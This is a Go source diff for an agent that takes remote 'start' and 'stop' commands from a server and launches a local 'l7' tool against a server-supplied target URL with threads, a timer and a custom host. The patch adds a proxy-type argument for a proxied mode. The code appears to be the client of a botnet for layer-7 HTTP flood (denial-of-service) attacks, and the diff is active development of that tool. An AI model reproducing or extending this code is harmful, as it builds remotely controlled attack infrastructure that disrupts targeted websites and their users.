@@ -147,7 +147,7 @@ func (a *Agent) stopCurrent() {
 	a.currCmd = nil
 }
 
-func (a *Agent) executeL7(ctx context.Context, targetURL string, threads, timer int, customHost string, method string) {
+func (a *Agent) executeL7(ctx context.Context, targetURL string, threads, timer int, customHost string, method string, proxyType string) {
 	// Validate URL on the agent side — never trust server input blindly.
 	if err := validateURL(targetURL); err != nil {
 		slog.Error("invalid target URL from server", "err", err)
@@ -181,18 +181,26 @@ func (a *Agent) executeL7(ctx context.Context, targetURL string, threads, timer 
 	}()
 
 	args := []string{targetURL, strconv.Itoa(threads), strconv.Itoa(timer)}
+	if method == "l7p" {
+		// The new unified l7 tool requires PROXY_TYPE as the 4th argument for proxy mode.
+		if proxyType == "" {
+			proxyType = "http" // fallback
+		}
+		args = append(args, proxyType)
+	}
 	if customHost != "" {
 		args = append(args, customHost)
 	}
 
 	executable := "l7"
-	if method == "l7p" {
-		executable = "l7p"
-	}
 	if runtime.GOOS == "windows" {
 		executable += ".exe"
 	}
-	executable = filepath.Join(".", executable)
+	if abs, err := filepath.Abs(executable); err == nil {
+		executable = abs
+	} else {
+		executable = "." + string(filepath.Separator) + executable
+	}
 
 	cmd := exec.CommandContext(runCtx, executable, args...)
 	cmd.Stdout = os.Stdout
@@ -279,7 +287,7 @@ func (a *Agent) listenForCommands(ctx context.Context) {
 				case "start":
 					// Run in a goroutine so we don't block the dispatcher,
 					// but stopCurrent() inside executeL7 serialises starts.
-					go a.executeL7(ctx, cmd.URL, cmd.Threads, cmd.Timer, cmd.CustomHost, cmd.Method)
+					go a.executeL7(ctx, cmd.URL, cmd.Threads, cmd.Timer, cmd.CustomHost, cmd.Method, cmd.ProxyType)
 				case "stop":
 					a.stopCurrent()
 					a.mu.Lock()
